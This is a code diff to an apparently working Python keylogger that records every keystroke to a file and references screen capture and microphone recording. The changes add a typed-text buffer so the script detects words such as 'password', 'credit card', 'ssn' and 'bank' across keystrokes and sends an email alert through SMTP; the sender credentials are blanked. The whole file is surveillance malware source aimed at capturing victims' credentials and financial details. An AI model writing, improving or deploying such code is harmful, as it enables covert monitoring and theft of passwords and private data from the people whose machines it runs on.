@@ -7,6 +7,8 @@ import time
 from PIL import ImageGrab
 import smtplib
 from email.mime.text import MIMEText
+from email.message import EmailMessage
+
 
 microphone_time = 10
 audio_information = "data\\aduio.wav"
@@ -23,9 +25,9 @@ sensitive_words = {"password", "credit card", "ssn", "bank", "confidential"}
 
 
 def send_alert_email(detected_word):
-    sender_email = "your_email@gmail.com"
-    receiver_email = "recipient_email@gmail.com"
-    password = "your_password"
+    sender_email = ""
+    receiver_email = ""
+    password = ""
 
     msg = EmailMessage()
     msg["Subject"] = "ALERT: Sensitive Word Detected"
@@ -65,31 +67,38 @@ while number_of_iterations<number_of_iterations_end:
     keys = []
 
     def on_press(key):
-        global keys, count, currentTime
+        global keys, count, currentTime  # Use global count
 
         print(key)
         keys.append(key)
-        count += 1
+        count += 1  # Increment count
         currentTime = time.time()
-        if count >= 1:
-            count=0
+
+        if count >= 1:  # Writes after every key press
+            count = 0
             write_file(keys)
-            keys=[]
+            keys = []
+
+    buffer = ""
 
     def write_file(keys):
+        global buffer
         with open(key_information, "a") as f:
             for key in keys:
-                key_str = str(key).replace("'", "")  # Convert key to string and clean it
+                key_str = str(key).replace("'", "")
 
                 if "space" in key_str:
                     f.write("\n")
-                elif "Key" not in key_str:  # Ignore special keys like shift, ctrl, etc.
+                    buffer += " "  # Add space to the buffer
+                elif "Key" not in key_str:  # Ignore special keys
                     f.write(key_str)
+                    buffer += key_str  # Store typed keys
 
                 # Check for sensitive words
                 for word in sensitive_words:
-                    if word in key_str.lower():  # Convert key_str to lowercase
+                    if word in buffer.lower():
                         send_alert_email(word)
+                        buffer = ""
 
 
     def on_release(key):
